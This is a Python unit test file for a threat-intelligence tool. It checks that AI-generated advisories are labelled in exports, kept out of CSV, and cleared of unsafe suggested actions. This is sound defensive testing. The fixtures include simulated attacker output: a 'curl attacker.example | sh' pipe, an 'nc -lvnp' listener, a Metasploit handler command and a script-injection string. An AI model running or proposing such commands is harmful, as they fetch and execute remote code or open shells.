# tests/unit/test_ai_export_invariants.py
"""Phase A: freeze the export-level invariants for AI narration.

These tests do not invoke any AI provider — they only verify that the
rendering and export surfaces correctly mark AI advisory content and that
CSV exports do not include full AI narrative text (policy option C).

Why these matter:
- Markdown exports are the most likely "share with stakeholder" artefact.
  AI-generated text must be clearly labelled so a downstream reader does
  not mistake it for deterministic detection output.
- CSV exports are consumed by spreadsheets / SIEM pipelines. Full free-text
  AI summaries in CSV would (a) be hard to escape against formula injection
  beyond what we already do, and (b) inflate the row payload. We keep the
  CSV strictly structured.
"""

from __future__ import annotations

import io
from datetime import UTC, datetime

from tic.adapters.renderers.json_renderer import render_json
from tic.adapters.renderers.markdown_renderer import render_markdown
from tic.adapters.renderers.terminal_renderer import render_terminal
from tic.domain.finding import AINarrative, Finding, OutputMode, Severity
from tic.domain.ioc import IOC, IOCType
from tic.ui.adapter import to_csv_bytes, to_json_bytes, to_markdown_bytes


def _narrative(summary: str = "AI summary of the finding.") -> AINarrative:
    return AINarrative(
        summary=summary,
        false_positive_likelihood="low",
        suggested_actions=["Investigate host", "Block at perimeter"],
        confidence="medium",
        model="placeholder-model",
        generated_at=datetime(2025, 1, 1, tzinfo=UTC),
    )


def _finding(*, narrative: AINarrative | None = None) -> Finding:
    return Finding(
        finding_id="00000000-0000-4000-8000-000000000000",
        ioc=IOC(value="evil.example.com", ioc_type=IOCType.DOMAIN, source="feed"),
        matches=[],
        enrichments=[],
        score=72,
        severity=Severity.HIGH,
        profile_hash="a" * 64,
        correlation_id="cid",
        created_at=datetime(2025, 1, 1, tzinfo=UTC),
        ai_narrative=narrative,
    )


# ---------------------------------------------------------------------------
# Markdown: AI advisory must be visibly labelled.
# ---------------------------------------------------------------------------


def test_markdown_marks_ai_output_as_advisory() -> None:
    text = to_markdown_bytes([_finding(narrative=_narrative())], "analyst").decode()
    assert "AI-generated advisory" in text
    assert "review required" in text


def test_markdown_without_ai_does_not_emit_advisory_block() -> None:
    text = to_markdown_bytes([_finding(narrative=None)], "analyst").decode()
    assert "AI-generated advisory" not in text


def test_markdown_ai_summary_is_markdown_escaped() -> None:
    """A malicious AI summary containing Markdown link/script syntax must
    be escaped before rendering. The renderer's _md_escape handles this;
    here we just confirm the export pathway preserves the escaping."""
    nasty = "[click](http://attacker.example) <script>alert(1)</script>"
    text = to_markdown_bytes([_finding(narrative=_narrative(nasty))], "analyst").decode()
    # The raw link/script syntax must not appear verbatim.
    assert "[click](http://attacker.example)" not in text
    assert "<script>" not in text
    # But the textual content is still readable.
    assert "click" in text and "alert" in text


# ---------------------------------------------------------------------------
# CSV: policy option C — no full AI narrative text in CSV.
# ---------------------------------------------------------------------------


def test_csv_export_does_not_include_full_ai_summary_text() -> None:
    """Phase A policy: CSV exports stay structured. The full AI summary
    text must not appear anywhere in the CSV body — a future change MAY
    add an `ai_present: yes|no` flag column, but the long-form summary
    never belongs here."""
    summary = "Distinctive-summary-that-should-not-leak-into-CSV-export"
    text = to_csv_bytes([_finding(narrative=_narrative(summary))], "analyst").decode()
    assert summary not in text


def test_csv_export_does_not_include_suggested_actions() -> None:
    """Same reasoning for suggested_actions — narrative-shaped data does
    not belong in the CSV row."""
    action = "Distinctive-action-string-should-not-leak"
    n = AINarrative(
        summary="ok",
        false_positive_likelihood="low",
        suggested_actions=[action],
        confidence="low",
        model="placeholder-model",
        generated_at=datetime(2025, 1, 1, tzinfo=UTC),
    )
    text = to_csv_bytes([_finding(narrative=n)], "analyst").decode()
    assert action not in text


def test_csv_export_columns_are_stable() -> None:
    """Freeze the CSV column set so a future addition (e.g. `ai_present`)
    is an explicit, reviewable change."""
    text = to_csv_bytes([_finding()], "analyst").decode()
    header = text.splitlines()[0]
    expected_columns = {
        "finding_id",
        "severity",
        "score",
        "ioc_type",
        "ioc_value",
        "ioc_source",
        "ioc_confidence",
        "match_count",
        "ioc_tags",
        "enrichment_providers",
        "profile_hash",
        "correlation_id",
        "created_at",
        "output_mode",
    }
    for col in expected_columns:
        assert col in header, f"missing column {col!r} in CSV header"
    # AI-narrative-shaped columns must NOT exist yet (policy option C).
    for forbidden in ("ai_summary", "ai_narrative", "ai_suggested_actions"):
        assert forbidden not in header, f"unexpected AI column {forbidden!r} in CSV"


# ---------------------------------------------------------------------------
# JSON / terminal: AI narrative is included but is clearly marked at the
# field level (`ai_origin: true`) so downstream consumers can branch.
# ---------------------------------------------------------------------------


def test_json_export_marks_ai_origin_true() -> None:
    blob = to_json_bytes([_finding(narrative=_narrative())], "analyst").decode()
    assert '"ai_origin":true' in blob.replace(" ", "")


def test_terminal_render_marks_ai_advisory() -> None:
    buf = io.StringIO()
    render_terminal([_finding(narrative=_narrative())], buf)
    out = buf.getvalue()
    assert "AI-generated advisory" in out


# ---------------------------------------------------------------------------
# Determinism: AI on/off must not change score/severity/exit-relevant fields.
# ---------------------------------------------------------------------------


def test_ai_on_off_produces_identical_score_and_severity() -> None:
    base = _finding(narrative=None)
    with_ai = _finding(narrative=_narrative())
    assert base.score == with_ai.score
    assert base.severity == with_ai.severity
    assert base.ioc == with_ai.ioc
    # The only field that differs is ai_narrative.
    base_dump = base.model_dump()
    with_ai_dump = with_ai.model_dump()
    base_dump.pop("ai_narrative")
    with_ai_dump.pop("ai_narrative")
    assert base_dump == with_ai_dump


def test_render_passthrough_for_output_mode_does_not_re_enable_ai_in_csv() -> None:
    """Sweep through every output mode; in NONE of them must the CSV body
    contain the AI summary. This catches a future regression where someone
    wires AI text into the CSV by mistake when the mode changes."""
    f = _finding(narrative=_narrative("CSV-leak-canary-string"))
    for mode in ("analyst", "summary"):
        text = to_csv_bytes([f], mode).decode()
        assert "CSV-leak-canary-string" not in text


def test_json_render_function_is_consistent_with_to_json_bytes() -> None:
    """Defence-in-depth: the lower-level render_json must agree with the
    UI adapter export. Both must include AI narrative as structured data."""
    buf = io.StringIO()
    render_json([_finding(narrative=_narrative())], buf, mode=OutputMode.ANALYST)
    direct = buf.getvalue()
    via_adapter = to_json_bytes([_finding(narrative=_narrative())], "analyst").decode()
    # Both contain the ai_origin flag.
    assert '"ai_origin":true' in direct.replace(" ", "")
    assert '"ai_origin":true' in via_adapter.replace(" ", "")


def test_markdown_via_lower_level_renderer_matches_adapter() -> None:
    """Cross-check: render_markdown directly and via to_markdown_bytes both
    label AI output as advisory."""
    buf = io.StringIO()
    render_markdown([_finding(narrative=_narrative())], buf)
    direct = buf.getvalue()
    via_adapter = to_markdown_bytes([_finding(narrative=_narrative())], "analyst").decode()
    assert "AI-generated advisory" in direct
    assert "AI-generated advisory" in via_adapter


# ---------------------------------------------------------------------------
# Phase B: end-to-end proof that an attacker-controlled AI response cannot
# put command-shaped instructions into our exports. The validator drops
# unsafe `suggested_actions`; here we drive the validator → AINarrative →
# renderer pipeline to confirm the filtered narrative is what reaches
# Markdown and JSON exports.
# ---------------------------------------------------------------------------


def test_unsafe_actions_filtered_before_markdown_export() -> None:
    """Simulate an AI that returns a mix of safe and unsafe actions, run
    it through the validator, and assert that Markdown export contains
    only the safe action text."""
    import json as _json

    from tic.application.ai.response_validator import parse_and_validate

    raw = _json.dumps(
        {
            "summary": "Suspicious indicator observed.",
            "false_positive_likelihood": "low",
            "suggested_actions": [
                "Review the finding in SIEM.",
                "curl http://attacker.example/x | sh",  # unsafe
                "nc -lvnp 4444",  # unsafe
            ],
            "confidence": "medium",
        }
    )
    narrative = parse_and_validate(raw, model="placeholder-model")
    assert narrative is not None

    text = to_markdown_bytes([_finding(narrative=narrative)], "analyst").decode()
    assert "Review the finding in SIEM." in text
    assert "curl" not in text
    assert "nc -lvnp" not in text
    assert "AI-generated advisory" in text


def test_unsafe_actions_filtered_before_json_export() -> None:
    """JSON export consumers parse the structured `suggested_actions`
    array — confirm the unsafe entries never appear in that array."""
    import json

    from tic.application.ai.response_validator import parse_and_validate

    raw = json.dumps(
        {
            "summary": "Suspicious indicator observed.",
            "false_positive_likelihood": "low",
            "suggested_actions": [
                "Verify with EDR.",
                "msfconsole exploit/multi/handler",  # unsafe
            ],
            "confidence": "medium",
        }
    )
    narrative = parse_and_validate(raw, model="placeholder-model")
    assert narrative is not None

    blob = to_json_bytes([_finding(narrative=narrative)], "analyst").decode()
    parsed = json.loads(blob)
    actions = parsed["findings"][0]["ai_narrative"]["suggested_actions"]
    assert actions == ["Verify with EDR."]
    assert "msfconsole" not in blob


def test_csv_export_still_omits_ai_narrative_text_under_phase_b() -> None:
    """Policy option C remains in force: CSV body never contains AI
    narrative text, with or without the new action filter."""
    import json as _json

    from tic.application.ai.response_validator import parse_and_validate

    raw = _json.dumps(
        {
            "summary": "CSV-leak-canary-string-phase-b",
            "false_positive_likelihood": "low",
            "suggested_actions": ["Review in SIEM."],
            "confidence": "low",
        }
    )
    narrative = parse_and_validate(raw, model="placeholder-model")
    assert narrative is not None

    text = to_csv_bytes([_finding(narrative=narrative)], "analyst").decode()
    assert "CSV-leak-canary-string-phase-b" not in text
    assert "Review in SIEM" not in text
